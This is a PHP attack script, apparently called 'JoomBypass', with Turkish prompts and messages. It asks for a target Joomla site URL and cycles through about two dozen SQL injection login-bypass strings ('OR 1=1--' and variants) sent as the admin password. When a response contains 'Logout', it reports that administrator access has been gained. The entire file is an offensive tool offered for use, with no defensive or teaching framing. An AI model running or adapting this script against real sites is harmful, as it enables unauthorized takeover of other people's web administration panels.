<?php
echo "       dP                               888888ba                                               \n";
echo "       88                               88    `8b                                              \n";
echo "       88 .d8888b. .d8888b. 88d8b.d8b. a88aaaa8P' dP    dP 88d888b. .d8888b. .d8888b. .d8888b. \n";
echo "       88 88'  `88 88'  `88 88'`88'`88  88   `8b. 88    88 88'  `88 88'  `88 Y8ooooo. Y8ooooo. \n";
echo "88.  .d8P 88.  .88 88.  .88 88  88  88  88    .88 88.  .88 88.  .88 88.  .88       88       88 \n";
echo " `Y8888'  `88888P' `88888P' dP  dP  dP  88888888P `8888P88 88Y888P' `88888P8 `88888P' `88888P' \n";
echo "                                                       .88 88                                 \n";
echo "                                                   d8888P  dP                                 \n";
?>
<?php

$payloadlar = array(
    "' OR '1'='1",
    "' OR '1'='1#",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 1=1;%00",
    "' OR 'x'='x",
    "' OR 'x'='x#",
    "' OR 'x'='x--",
    "' OR 'x'='x/*",
    "' OR 'x'='x;%00",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "' OR '1'='1';%00",
    "' OR 'x'='x'--",
    "' OR 'x'='x'#",
    "' OR 'x'='x'/*",
    "' OR 'x'='x';%00",
    "' OR 1=1 /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1;%00",
    "' OR '1'='1",
    "' OR 'x'='x"
);


$joomla_site = readline("Hedef Joomla sitesinin URL'sini girin: ");


$joomla_istegi = $joomla_site . "/administrator/index.php?option=com_users&view=login&return=aW5kZXgucGhwP10&task=user.login&username=admin&password=";


foreach ($payloadlar as $payload) {
    
    $kodlanmis_payload = urlencode($payload);

    
    $istek_url = $joomla_istegi . $kodlanmis_payload;

    
    $yanit = file_get_contents($istek_url);

    
    if (strpos($yanit, "Logout") !== false) {
        echo "Payload '$payload' ile saldırı başarılı oldu!\n";
        echo "Artık bir yönetici olarak oturum açtınız.\n\n";
        // Saldırı başarılı olduğunda döngüden çık
        break;
    } else {
        echo "Payload '$payload' ile saldırı başarısız oldu.\n";
    }
}
?>
